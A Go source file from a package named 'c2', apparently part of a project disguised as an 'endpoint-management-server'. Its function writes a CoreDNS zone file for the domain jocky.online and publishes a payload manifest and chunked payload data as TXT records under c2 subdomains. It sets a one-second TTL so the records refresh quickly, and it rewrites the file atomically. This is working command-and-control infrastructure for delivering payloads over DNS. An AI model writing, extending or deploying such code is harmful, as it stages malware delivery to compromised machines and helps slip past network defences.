package c2

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"

	"endpoint-management-server/internal/models"
)

// WriteZoneFile renders a CoreDNS zone file containing the payload
// manifest and all chunk TXT records, then atomically replaces the
// file at path.  CoreDNS reloads the file every 5 s automatically.
//
// Zone structure:
//
//	manifest.c2   IN TXT  "<manifest_json>"
//	chunk-0.c2    IN TXT  "<chunk_data_in_255byte_segments>"
//	chunk-1.c2    IN TXT  ...
func WriteZoneFile(path, ec2IP string, chunks []string, manifest models.PayloadManifest) error {
	manifestJSON, err := json.Marshal(manifest)
	if err != nil {
		return fmt.Errorf("zone writer: marshal manifest: %w", err)
	}

	// Serial: YYYYMMDDnn — use 01 as the daily increment for simplicity.
	serial := time.Now().UTC().Format("2006010201")

	var sb strings.Builder

	fmt.Fprintf(&sb, "$ORIGIN jocky.online.\n")
	fmt.Fprintf(&sb, "$TTL 1\n")
	fmt.Fprintf(&sb, "@ IN SOA ns1.jocky.online. admin.jocky.online. (\n")
	fmt.Fprintf(&sb, "    %s 3600 900 604800 1 )\n", serial)
	fmt.Fprintf(&sb, "@ IN NS ns1.jocky.online.\n")
	fmt.Fprintf(&sb, "ns1 IN A %s\n", ec2IP)
	fmt.Fprintf(&sb, "c2  IN A %s\n\n", ec2IP)

	fmt.Fprintf(&sb, "manifest.c2 IN TXT %s\n\n", formatTXTValue(string(manifestJSON)))

	for i, chunk := range chunks {
		fmt.Fprintf(&sb, "chunk-%d.c2 IN TXT %s\n", i, formatTXTValue(chunk))
	}

	// Write atomically via a temp file + rename so CoreDNS never reads
	// a partially-written zone.
	tmpPath := path + ".tmp"
	if err := os.WriteFile(tmpPath, []byte(sb.String()), 0644); err != nil {
		return fmt.Errorf("zone writer: write temp: %w", err)
	}
	if err := os.Rename(tmpPath, path); err != nil {
		return fmt.Errorf("zone writer: rename: %w", err)
	}
	return nil
}

// formatTXTValue splits a string into RFC-1035-compliant 255-byte
// quoted segments.  DNS TXT record character-strings may not exceed
// 255 octets each; multiple strings in a single record are
// concatenated by resolvers.
func formatTXTValue(s string) string {
	const maxSeg = 255
	var parts []string
	for len(s) > 0 {
		end := maxSeg
		if end > len(s) {
			end = len(s)
		}
		parts = append(parts, `"`+s[:end]+`"`)
		s = s[end:]
	}
	return strings.Join(parts, " ")
}
